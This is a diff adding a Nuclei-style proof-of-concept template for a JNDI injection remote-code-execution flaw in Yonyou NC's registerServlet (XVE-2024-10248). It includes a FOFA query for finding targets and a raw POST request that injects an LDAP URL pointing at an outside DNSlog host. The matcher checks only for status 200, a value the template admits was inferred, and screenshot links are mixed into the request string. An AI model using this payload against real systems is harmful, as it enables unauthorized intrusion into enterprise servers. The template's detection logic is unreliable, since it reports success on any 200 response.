@@ -1,0 +1,44 @@
+id: poc-egg4r1ru0pgm7ait
+info:
+  name: 用友NC registerServlet JNDI 远程代码执行漏洞复现(XVE-2024-10248)
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/egg4r1ru0pgm7ait
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: egg4r1ru0pgm7ait
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/registerServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,zh-CN;q=0.6
+
+    Content-Type: application/x-www-form-urlencoded
+
+    type=1&dsname=ldap://xxxx.dnslog.cn
+
+
+    DNSLOG验证
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1716207889503-248e2b07-2076-439f-b3f4-b177a70f97a4.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1716207889782-2a1d523b-821e-49be-a0cb-b94df1fe619b.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1716207890046-c2d907f7-79b4-4772-9728-741255cf1430.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
